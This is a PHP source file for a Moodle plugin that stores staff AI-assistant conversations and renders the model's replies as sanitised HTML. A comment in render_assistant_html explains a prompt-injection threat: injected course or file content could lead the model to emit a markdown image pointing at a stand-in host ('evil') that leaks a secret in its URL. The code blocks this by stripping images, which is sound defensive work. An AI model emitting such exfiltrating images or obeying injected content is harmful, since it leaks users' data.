<?php
// This file is part of Moodle - https://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <https://www.gnu.org/licenses/>.

/**
 * Conversation + message store, and the send boundary over the lane handlers.
 *
 * @package    local_groundedai
 * @copyright  2026 Vbounds LLC (Sternfast)
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */

namespace local_groundedai\local;

/**
 * One place for the chat data model. The UI's AJAX endpoints are thin wrappers over these methods.
 * send() is the only method that talks to the model: it persists the user turn, routes to the already
 * working lane handler, and persists the reply — the UI never re-implements grounding or tool-calling.
 */
class conversation {
    /** @var string The only conversation lane that has a handler. The 'lane' column is kept for the
     * stored data model and the web-service contract, but every conversation is a staff conversation. */
    private const LANE = 'staff';

    /**
     * Check the acting user may open the staff assistant (the kill switch + the access rules).
     *
     * @param \context $context The context the chat belongs to.
     */
    public static function require_access(\context $context): void {
        global $USER;
        if (!get_config('local_groundedai', 'enablestaff')) {
            throw new \moodle_exception('staffdisabled', 'local_groundedai');
        }
        // Hard safety invariant: halt outright if the allow-list ever contains a student/guest role.
        access_manager::assert_no_forbidden_access();
        if (!access_manager::can_use($USER->id)) {
            throw new \moodle_exception('noaccess', 'local_groundedai');
        }
    }

    /**
     * The context a conversation belongs to (for validate_context in the web-service layer).
     *
     * @param int $conversationid Conversation id.
     * @return \context
     */
    public static function context_for(int $conversationid): \context {
        global $DB;
        $contextid = $DB->get_field('local_groundedai_conversations', 'contextid', ['id' => $conversationid], MUST_EXIST);
        return \context::instance_by_id($contextid);
    }

    /**
     * Create an empty conversation.
     *
     * @param int $userid Owner.
     * @param int $contextid Context id.
     * @return int New conversation id.
     */
    public static function create(int $userid, int $contextid): int {
        global $DB;
        $now = time();
        return (int) $DB->insert_record('local_groundedai_conversations', (object) [
            'userid'       => $userid,
            'contextid'    => $contextid,
            'lane'         => self::LANE,
            'name'         => get_string('newchat', 'local_groundedai'),
            'archived'     => 0,
            'timecreated'  => $now,
            'timemodified' => $now,
        ]);
    }

    /**
     * A user's conversations in a context + lane, newest activity first.
     *
     * @param int $userid Owner.
     * @param string $lane The conversation lane (staff).
     * @param int $contextid Context id.
     * @param bool $archived Return the archived set instead of active.
     * @return array List of {id, name, archived, timemodified}.
     */
    public static function get_list(int $userid, string $lane, int $contextid, bool $archived): array {
        global $DB;
        $records = $DB->get_records('local_groundedai_conversations', [
            'userid' => $userid, 'lane' => $lane, 'contextid' => $contextid, 'archived' => $archived ? 1 : 0,
        ], 'timemodified DESC', 'id, name, archived, timemodified');
        return array_values($records);
    }

    /**
     * Fetch a conversation and assert the user owns it.
     *
     * @param int $conversationid Conversation id.
     * @param int $userid Acting user.
     * @return \stdClass
     */
    protected static function owned(int $conversationid, int $userid): \stdClass {
        global $DB;
        $conv = $DB->get_record('local_groundedai_conversations', ['id' => $conversationid], '*', MUST_EXIST);
        if ((int) $conv->userid !== $userid) {
            throw new \moodle_exception('notyours', 'local_groundedai');
        }
        return $conv;
    }

    /**
     * Rename a conversation.
     *
     * @param int $conversationid Conversation id.
     * @param int $userid Acting user.
     * @param string $name New title.
     */
    public static function rename(int $conversationid, int $userid, string $name): void {
        global $DB;
        self::owned($conversationid, $userid);
        $DB->update_record('local_groundedai_conversations', (object) [
            'id' => $conversationid, 'name' => \core_text::substr(trim($name), 0, 255), 'timemodified' => time(),
        ]);
    }

    /**
     * Archive or unarchive a conversation (reversible).
     *
     * @param int $conversationid Conversation id.
     * @param int $userid Acting user.
     * @param bool $archived Target state.
     */
    public static function set_archived(int $conversationid, int $userid, bool $archived): void {
        global $DB;
        self::owned($conversationid, $userid);
        $DB->update_record('local_groundedai_conversations', (object) [
            'id' => $conversationid, 'archived' => $archived ? 1 : 0, 'timemodified' => time(),
        ]);
    }

    /**
     * Delete a conversation and its messages.
     *
     * @param int $conversationid Conversation id.
     * @param int $userid Acting user.
     */
    public static function delete(int $conversationid, int $userid): void {
        global $DB;
        $conv = self::owned($conversationid, $userid);

        // Remove attachments (rows + their stored files + extracted text) so nothing is orphaned.
        $attachids = $DB->get_fieldset_select(
            'local_groundedai_attach',
            'id',
            'conversationid = :cid',
            ['cid' => $conversationid]
        );
        foreach ($attachids as $attachid) {
            attachment_manager::delete((int) $attachid, $userid);
        }
        // Remove any generated export files for this conversation.
        get_file_storage()->delete_area_files(
            $conv->contextid,
            'local_groundedai',
            exporter::FILEAREA,
            $conversationid
        );

        $DB->delete_records('local_groundedai_messages', ['conversationid' => $conversationid]);
        $DB->delete_records('local_groundedai_conversations', ['id' => $conversationid]);
    }

    /**
     * Messages for a conversation, oldest-first, cursor-paginated.
     *
     * @param int $conversationid Conversation id.
     * @param int $userid Acting user.
     * @param int $before Return messages with id < this (0 = latest page).
     * @param int $limit Page size.
     * @param int $after Refresh mode: return messages with id > this, oldest-first (0 = off). Used to
     *                   pull in turns another open view of this conversation has added, without a reload.
     * @return array {messages: array, hasmore: bool}
     */
    public static function get_messages(int $conversationid, int $userid, int $before = 0, int $limit = 30, int $after = 0): array {
        global $DB;
        $conv = self::owned($conversationid, $userid);
        if ($after > 0) {
            $records = $DB->get_records_select(
                'local_groundedai_messages',
                'conversationid = :cid AND id > :after',
                ['cid' => $conversationid, 'after' => $after],
                'id ASC',
                'id, role, content, metadata, timecreated',
                0,
                $limit
            );
            $context = \context::instance_by_id($conv->contextid);
            return ['messages' => self::with_html(array_values($records), $context), 'hasmore' => false];
        }
        $params = ['cid' => $conversationid];
        $where = 'conversationid = :cid';
        if ($before > 0) {
            $where .= ' AND id < :before';
            $params['before'] = $before;
        }
        $records = $DB->get_records_select(
            'local_groundedai_messages',
            $where,
            $params,
            'id DESC',
            'id, role, content, metadata, timecreated',
            0,
            $limit + 1
        );
        $hasmore = count($records) > $limit;
        if ($hasmore) {
            array_pop($records);
        }
        $context = \context::instance_by_id($conv->contextid);
        $messages = self::with_html(array_reverse(array_values($records)), $context);
        return ['messages' => $messages, 'hasmore' => $hasmore];
    }

    /**
     * Add a rendered-HTML field to each message: markdown for the assistant, escaped plain for the
     * user. The formatter cleans the HTML, so model/file-derived content cannot inject markup.
     *
     * @param array $messages Message rows.
     * @param \context $context The conversation context (for the formatter).
     * @return array
     */
    protected static function with_html(array $messages, \context $context): array {
        foreach ($messages as $message) {
            $message->contenthtml = (($message->role ?? '') === 'assistant')
                ? self::render_assistant_html((string) $message->content, $context)
                : '';
        }
        return $messages;
    }

    /**
     * Render one assistant message's markdown to safe HTML for display.
     *
     * The pipeline is: protect LaTeX math from the markdown processor, render with format_text (which
     * cleans HTML — scripts and event handlers are stripped), DROP any remote image, autolink bare URLs,
     * then restore the math. Public so the output wall can be regression-tested directly.
     *
     * @param string $content The assistant's raw markdown.
     * @param \context $context The context to render in.
     * @return string Sanitised HTML.
     */
    public static function render_assistant_html(string $content, \context $context): string {
        // Protect LaTeX math from the markdown processor (which eats the backslashes in \( \) and \[ \]),
        // render, then restore the delimiters intact so Moodle's MathJax filter — applied client-side to
        // the injected reply — can typeset it.
        [$protected, $math] = self::protect_math($content);
        $html = format_text(
            self::normalize_markdown($protected),
            FORMAT_MARKDOWN,
            ['context' => $context, 'filter' => false]
        );
        // Strip any image the model emitted. The assistant answers in text and never needs to embed a
        // remote image; left in, a model steered by injected course/forum/file content could use
        // `![](https://evil/?d=<secret>)` as a zero-click, render-time exfiltration channel — the browser
        // auto-fetches the src and the data rides out in the URL (format_text keeps <img src=http(s)> by
        // design, since images are normal Moodle content). Links stay (they never auto-load).
        $html = preg_replace('/<img\b[^>]*>/i', '', $html);
        // Make links clickable: autolink bare URLs the model wrote as plain text (the URL filter is off
        // here), and open every link in a new tab so following a Moodle deep link does not lose the chat.
        // Done while math is still a placeholder, so equations are never touched.
        $html = self::hyperlinkify($html);
        return self::restore_math($html, $math);
    }

    /**
     * Replace LaTeX math spans with inert placeholders so the markdown renderer leaves them untouched.
     * Single $...$ is deliberately left alone (too many false positives with currency), matching Moodle's
     * MathJax defaults. The captured math is HTML-escaped so restoring it cannot inject markup.
     *
     * @param string $text Raw assistant markdown.
     * @return array [text with placeholders, map of placeholder => escaped math].
     */
    protected static function protect_math(string $text): array {
        $store = [];
        $capture = static function (array $matches) use (&$store): string {
            $key = '@@GAIMATH' . count($store) . '@@';
            // Wrap in the class Moodle's MathJax filter uses, so the client loader (triggered after the
            // reply is injected) typesets it. If that filter is off, it is an inert span showing the LaTeX.
            $store[$key] = '<span class="filter_mathjaxloader_equation">' . s($matches[0]) . '</span>';
            return $key;
        };
        $text = preg_replace_callback('/\$\$.+?\$\$/s', $capture, $text);
        $text = preg_replace_callback('/\\\\\[.+?\\\\\]/s', $capture, $text);
        $text = preg_replace_callback('/\\\\\(.+?\\\\\)/s', $capture, $text);
        return [$text, $store];
    }

    /**
     * Put the protected math back into the rendered HTML.
     *
     * @param string $html Rendered HTML containing placeholders.
     * @param array $store Map of placeholder => escaped math.
     * @return string
     */
    protected static function restore_math(string $html, array $store): string {
        return $store ? strtr($html, $store) : $html;
    }

    /**
     * Turn plain-text URLs into links and make every link open in a new tab.
     *
     * The renderer runs with filters off (so Moodle's URL-to-link filter never fires), which means a
     * bare https URL the model wrote stays plain text. This walks the already-rendered, already-escaped
     * HTML and links bare URLs found in visible text only — never inside a tag, an existing anchor, or a
     * code/pre block. Because the text is already HTML-escaped, the matched substring is inserted
     * verbatim (re-escaping would double-encode entities such as &amp; in query strings). Finally every
     * anchor gets target=_blank + rel=noopener so links open safely without leaving the conversation.
     *
     * @param string $html Rendered, escaped assistant HTML.
     * @return string
     */
    protected static function hyperlinkify(string $html): string {
        $parts = preg_split('/(<[^>]+>)/s', $html, -1, PREG_SPLIT_DELIM_CAPTURE);
        $skip = 0;
        foreach ($parts as $i => $part) {
            if ($part === '') {
                continue;
            }
            if ($part[0] === '<') {
                // Don't autolink inside anchors or code — track entering/leaving those regions.
                if (preg_match('#^<\s*(a|code|pre)[\s/>]#i', $part)) {
                    $skip++;
                } else if (preg_match('#^<\s*/\s*(a|code|pre)\s*>#i', $part)) {
                    $skip = max(0, $skip - 1);
                }
                continue;
            }
            if ($skip > 0) {
                continue;
            }
            // Match a bare URL in visible text. Stops at whitespace, "<" and '"' so it can never spill
            // into a tag or break an attribute.
            $parts[$i] = preg_replace_callback('#\bhttps?://[^\s<"]+#i', static function (array $m): string {
                $url = $m[0];
                // Peel trailing sentence punctuation off the link (but keep entity semicolons like
                // &amp; and a closing paren that balances one inside the URL).
                $trail = '';
                while ($url !== '') {
                    $last = substr($url, -1);
                    if (strpos('.,:!?', $last) !== false) {
                        $trail = $last . $trail;
                        $url = substr($url, 0, -1);
                        continue;
                    }
                    if ($last === ')' && substr_count($url, '(') < substr_count($url, ')')) {
                        $trail = $last . $trail;
                        $url = substr($url, 0, -1);
                        continue;
                    }
                    break;
                }
                return '<a href="' . $url . '" target="_blank" rel="noopener noreferrer">' . $url . '</a>' . $trail;
            }, $part);
        }
        $html = implode('', $parts);
        // Markdown-produced links have no target; make them open in a new tab too (skip ones we just made).
        return preg_replace('/<a\s+(?![^>]*\btarget=)/i', '<a target="_blank" rel="noopener noreferrer" ', $html);
    }

    /**
     * Small markdown hardening before the renderer. MarkdownExtra needs a blank line before a block
     * (a pipe-table, or a list) or it emits it inside the preceding paragraph, which renders oddly —
     * a table the browser splits, and a list whose items collapse onto one run-on line. Models
     * routinely glue a table or a numbered/bulleted list straight under a sentence.
     *
     * @param string $text Raw assistant markdown.
     * @return string
     */
    protected static function normalize_markdown(string $text): string {
        // An answer cut off mid-code-block (a length-capped reply) leaves an unterminated ``` fence,
        // which the renderer would otherwise print as literal text. Auto-close it so it still renders
        // as a code block. Triple backticks only ever delimit fences, so an odd count means unterminated.
        // phpcs:disable moodle.Strings.ForbiddenStrings.Found -- Triple backticks are markdown fences here, by design.
        if (substr_count($text, '```') % 2 === 1) {
            $text .= "\n```";
        }
        // phpcs:enable moodle.Strings.ForbiddenStrings.Found
        // Insert a blank line before a line that starts a pipe-table, when the previous line is
        // non-blank and is not itself a table row.
        $text = preg_replace('/([^\n|])\n(\|[^\n]*\|)/', "$1\n\n$2", $text);
        // Insert a blank line before the FIRST item of a list — ordered ("1. ") or unordered
        // ("- " / "* " / "+ ") — when the previous line is non-blank and is not itself a list item.
        // Requiring whitespace after the marker avoids false positives like "3.14" or "a-b". The
        // negative lookahead on the previous line keeps the blank line out from BETWEEN items, so the
        // list stays tight; only the join to the preceding paragraph is broken.
        $text = preg_replace(
            '/(\n|^)(?![ \t]*(?:\d+[.)]|[-*+])[ \t])([^\n]*\S[^\n]*)\n(?=[ \t]*(?:\d+[.)]|[-*+])[ \t])/',
            "$1$2\n\n",
            $text
        );
        return $text;
    }

    /**
     * Append a message.
     *
     * @param int $conversationid Conversation id.
     * @param string $role 'user', 'assistant' or 'tool'.
     * @param string $content Text.
     * @param array|null $metadata Extra data (sources, tools used, model).
     * @return int New message id.
     */
    protected static function add_message(int $conversationid, string $role, string $content, ?array $metadata = null): int {
        global $DB;
        return (int) $DB->insert_record('local_groundedai_messages', (object) [
            'conversationid' => $conversationid,
            'role'           => $role,
            'content'        => $content,
            'metadata'       => $metadata ? json_encode($metadata) : null,
            'timecreated'    => time(),
        ]);
    }

    /**
     * Recent prior turns to replay to the model: a sliding window capped by both a message count
     * and an approximate token budget, oldest-first, user/assistant only. Excludes the just-sent
     * turn (the lane handler appends the current question itself).
     *
     * @param int $conversationid Conversation id.
     * @param int $excludemsgid Return turns with id < this (the just-stored user turn).
     * @return array List of ['role' => string, 'content' => string], oldest-first.
     */
    public static function history_for_model(int $conversationid, int $excludemsgid = 0): array {
        global $DB;
        if (!get_config('local_groundedai', 'historyenabled')) {
            return [];
        }
        $maxturns = (int) get_config('local_groundedai', 'historymaxturns') ?: 10;
        // Roughly 4 chars per token, a deliberate over-estimate so the window never blows a small context.
        $maxchars = (((int) get_config('local_groundedai', 'historymaxtokens')) ?: 3000) * 4;

        $where = "conversationid = :cid AND role IN ('user', 'assistant') AND content <> ''";
        $params = ['cid' => $conversationid];
        if ($excludemsgid > 0) {
            $where .= ' AND id < :ex';
            $params['ex'] = $excludemsgid;
        }
        $rows = $DB->get_records_select(
            'local_groundedai_messages',
            $where,
            $params,
            'id DESC',
            'id, role, content',
            0,
            $maxturns
        );

        $picked = [];
        $chars = 0;
        foreach ($rows as $row) {                  // Newest -> oldest.
            $chars += \core_text::strlen($row->content);
            if ($chars > $maxchars && $picked) {
                break;                              // Keep at least one turn; stop once over budget.
            }
            $picked[] = ['role' => $row->role, 'content' => $row->content];
        }
        $picked = array_reverse($picked);           // Oldest -> newest for the model.
        while ($picked && $picked[0]['role'] === 'assistant') {
            array_shift($picked);                   // Never begin the window on an assistant turn.
        }
        return $picked;
    }

    /**
     * Send a message: persist it, route to the lane handler, persist the reply, return the new messages.
     *
     * @param int $conversationid Conversation id.
     * @param int $userid Acting user.
     * @param string $text The user's message.
     * @param int $cmid The activity (course module) the user is viewing, if any — an advisory page hint.
     * @return array The new messages {id, role, content, metadata, timecreated}.
     */
    public static function send(int $conversationid, int $userid, string $text, int $cmid = 0): array {
        global $DB;
        $conv = self::owned($conversationid, $userid);
        $text = trim($text);
        if ($text === '') {
            throw new \moodle_exception('emptyquestion', 'local_groundedai');
        }

        $context = \context::instance_by_id($conv->contextid);
        self::require_access($context);
        // Cap questions per user per hour (denial-of-wallet guard) before persisting or calling out.
        rate_limiter::check($userid);
        $courseid = (int) $context->get_course_context()->instanceid;

        $usermsgid = self::add_message($conversationid, 'user', $text);
        $history = self::history_for_model($conversationid, $usermsgid);

        $res = staff_assistant::answer($courseid, $userid, $text, $conversationid, $history, $cmid);
        $assistantmsgid = self::add_message(
            $conversationid,
            'assistant',
            $res['answer'],
            ['toolsused' => $res['toolsused'] ?? [], 'model' => $res['model'] ?? null]
        );

        // Name a fresh conversation after its first question with a short, tidy title.
        if ($conv->name === get_string('newchat', 'local_groundedai') || trim($conv->name) === '') {
            $DB->set_field(
                'local_groundedai_conversations',
                'name',
                self::make_title($text),
                ['id' => $conversationid]
            );
        }
        $DB->set_field('local_groundedai_conversations', 'timemodified', time(), ['id' => $conversationid]);

        // Return exactly this turn's two rows (the question and its reply) by id. The LLM round-trip above
        // takes seconds, so a concurrent send into the SAME conversation from another tab/view can insert
        // its own rows between these two ids; selecting the two known ids (rather than "id >= user") keeps
        // each view showing only its own turn. A separate "refresh since last id" pass pulls the other
        // view's turns in correct order.
        $new = $DB->get_records_select(
            'local_groundedai_messages',
            'conversationid = :cid AND id IN (:u, :a)',
            ['cid' => $conversationid, 'u' => $usermsgid, 'a' => $assistantmsgid],
            'id ASC',
            'id, role, content, metadata, timecreated'
        );
        return self::with_html(array_values($new), $context);
    }

    /**
     * Produce a short conversation title (2-4 words) from the first question.
     *
     * A fresh, cheap model call gives a tidy label the way mainstream chat apps do; it is
     * best-effort only, so any failure falls back to a word-trimmed slice of the question.
     *
     * @param string $question The first user message.
     * @return string A title of at most 48 characters.
     */
    private static function make_title(string $question): string {
        $fallback = self::trim_title($question);
        $question = trim($question);
        if ($question === '') {
            return $fallback;
        }
        try {
            $messages = [
                [
                    'role'    => 'system',
                    'content' => 'You write a title for a chat. Reply with ONLY a 2 to 4 word title that '
                        . 'captures the request. No quotation marks, no trailing punctuation, no prefix.',
                ],
                ['role' => 'user', 'content' => \core_text::substr($question, 0, 500)],
            ];
            // No temperature override: some models reject it (as provider_facade::chat notes).
            $reply = (new provider_facade())->chat($messages, 'cheap', ['max_tokens' => 16]);
            $title = self::trim_title($reply['content'] ?? '');
            return $title !== '' ? $title : $fallback;
        } catch (\Throwable $e) {
            // Titling is cosmetic; never let it break sending a message.
            return $fallback;
        }
    }

    /**
     * Clean a candidate title: strip quotes/wrapping, collapse whitespace, cap length and word count.
     *
     * @param string $text The raw candidate.
     * @return string
     */
    private static function trim_title(string $text): string {
        $text = trim(preg_replace('/\s+/u', ' ', (string) $text));
        // Drop surrounding quotes and a leading label the model sometimes adds (e.g. "Title:").
        $text = preg_replace('/^(title|chat)\s*[:\-]\s*/iu', '', $text);
        $text = trim($text, " \t\n\r\0\x0B\"'." . chr(96));
        if ($text === '') {
            return get_string('newchat', 'local_groundedai');
        }
        $words = preg_split('/\s+/u', $text);
        if (count($words) > 6) {
            $words = array_slice($words, 0, 6);
            $text = implode(' ', $words);
        }
        return \core_text::substr($text, 0, 48);
    }
}
